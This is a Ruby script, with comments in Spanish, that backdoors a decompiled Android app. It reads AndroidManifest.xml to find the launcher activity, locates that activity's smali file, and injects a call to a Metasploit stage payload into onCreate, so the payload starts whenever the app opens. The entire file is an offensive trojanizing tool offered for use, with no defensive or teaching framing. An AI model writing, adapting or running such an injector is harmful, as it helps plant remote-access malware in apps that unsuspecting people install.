#!/usr/bin/env ruby

require 'fileutils'
require 'find'
require 'nokogiri'

# ==============================================
# 🎨 AQUÍ SE PONEN LAS VARIABLES DE COLORES
# ==============================================
AMARILLO = "\e[1;33m"
RESET    = "\e[0m" # <-- ESTO ES IMPORTANTE para que lo que escribas vuelva a ser blanco
# ==============================================

# --- CONFIGURACIÓN DEL PAYLOAD ---
PAYLOAD = <<-'SMALI'

    # Injection de Metasploit
    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
SMALI

# --- FUNCIÓN DE INYECCIÓN ---
def inject_smali(file_path)
  lines = File.readlines(file_path)
  nuevo_archivo = []
  inyectado = false
  dentro_oncreate = false

  lines.each do |line|
    nuevo_archivo << line

    if line.include?('.method') && line.include?('onCreate') && line.include?('Bundle')
      dentro_oncreate = true
    end

    if line.include?('.end method')
      dentro_oncreate = false
    end

    if dentro_oncreate && line =~ /^\s*\.locals\s+\d+/ && !inyectado
      nuevo_archivo << PAYLOAD
      inyectado = true
    end
  end

  if inyectado
    File.write(file_path, nuevo_archivo.join)
    puts "[+] ✅ INYECCIÓN EXITOSA"
    puts "[✔] .locals ORIGINAL RESPETADO"
  else
    puts "[-] No se pudo inyectar (¿Ya estaba?)"
  end
end

# --- PASO 1: ENCONTRAR RUTA EXACTA ---
# ✨ AQUÍ USAMOS EL COLOR EN LA PREGUNTA
print "#{AMARILLO}Introduce la ruta de la carpeta del proyecto (ej: contra): #{RESET}"
folder_name = gets.chomp
manifest_path = "#{folder_name}/AndroidManifest.xml"

if File.exist?(manifest_path)
  doc = File.open(manifest_path) { |f| Nokogiri::XML(f) }

  main_activity = doc.at_xpath("//activity[intent-filter/action/@*[local-name()='name']='android.intent.action.MAIN']/@*[local-name()='name']")

  if main_activity
    activity_name = main_activity.to_s
    puts "[+] Activity Principal: #{activity_name}"

    smali_file = activity_name.gsub('.', '/') + ".smali"
    puts "[*] Buscando archivo: #{smali_file}"

    found_path = nil
    Find.find(folder_name) do |path|
      if path.end_with?(smali_file)
        found_path = path
        break
      end
    end

    if found_path && File.exist?(found_path)
      puts "[+] 🎯 Archivo encontrado en: #{found_path}"
      inject_smali(found_path)
    else
      puts "[-] No se encontró el archivo .smali físico."
      puts "[!] Revisa en: #{folder_name}/smali*/#{smali_file}"
    end

  else
    puts "[-] No se pudo encontrar la Main Activity en el XML."
  end
else
  puts "[-] Error: No existe #{manifest_path}"
end

